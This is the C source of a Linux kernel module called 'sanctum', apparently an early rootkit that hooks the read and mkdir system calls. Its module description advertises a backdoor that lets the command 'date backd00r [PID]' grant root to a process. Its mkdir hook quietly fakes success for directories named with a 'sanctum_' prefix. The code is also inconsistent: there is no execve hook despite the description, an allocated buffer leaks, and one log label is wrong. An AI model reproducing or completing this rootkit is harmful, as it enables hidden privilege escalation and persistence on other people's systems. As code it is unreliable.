#include "asm/current.h"
#include "asm/unistd_64.h"
#include "linux/gfp_types.h"
#include "linux/kern_levels.h"
#include "linux/printk.h"
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/kallsyms.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/module.h>
#include "hooker.h"
#include "linux/slab.h"
#include "linux/uaccess.h"
#include "protected.h"

#define SANCTUM_PREFIX "sanctum_"
#define MAX_PATH_LENGTH 256

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yigit Colakoglu");
MODULE_DESCRIPTION("Hooks the execve syscall and matches 'date backd00r [PID]' to elevate PID to root");

static sanctum_t* sanctums;

static char* get_last_token(char* str, char delim){
  int i = 0;
  int c = 0;

  for(i = 0; i < strlen(str); i++){
    if(str[i] == delim)
      c = i + 1;
  }

  return str + c;
}

asmlinkage long sanctum_read(const struct pt_regs* regs) {
  long result;

  // unsigned int fd = regs->di;
  // char __user *buf = (char*) regs->si;
  // size_t count = regs->dx;

  result = get_original_syscall(__NR_read)(regs);

  return result;
}

asmlinkage long sanctum_mkdir(const struct pt_regs* regs){
  char __user *pathname_u = (char*) regs->di;
  char *pathname;
  unsigned int pathlength;

  // umode_t mode = regs->si;
  pathname =  kzalloc(MAX_PATH_LENGTH, GFP_KERNEL);

  if(!pathname)
    return get_original_syscall(__NR_mkdir)(regs);

  pathlength = copy_from_user(pathname, pathname_u, MAX_PATH_LENGTH);

  if(!strncmp(get_last_token(pathname, '/'), SANCTUM_PREFIX, sizeof(SANCTUM_PREFIX) - 1)){
    printk("Trying to create sanctum on path %s\n", pathname);
    return 0;
  }

  return get_original_syscall(__NR_mkdir)(regs);
}


asmlinkage long sanctum_write(unsigned int fd, const char __user *buf,
			  size_t count){
  printk(KERN_INFO "Trying to read %ld from %u\n", count, fd);
  //return ((long (*)(unsigned int, char __user*, size_t))get_original_syscall(__NR_read))(fd, buf, count);
  return 0;
}

static int __init sanctum_init(void)
{
  printk(KERN_INFO "All lights are green...\n");
  printk(KERN_INFO "Found sys_close %lx\n", (unsigned long) get_original_syscall(__NR_read));
  hook_syscall(__NR_read, sanctum_read);
  hook_syscall(__NR_mkdir, sanctum_mkdir);
  return 0;
}



static void __exit sanctum_exit(void)
{
  unhook_all();
}

module_init(sanctum_init);
module_exit(sanctum_exit);
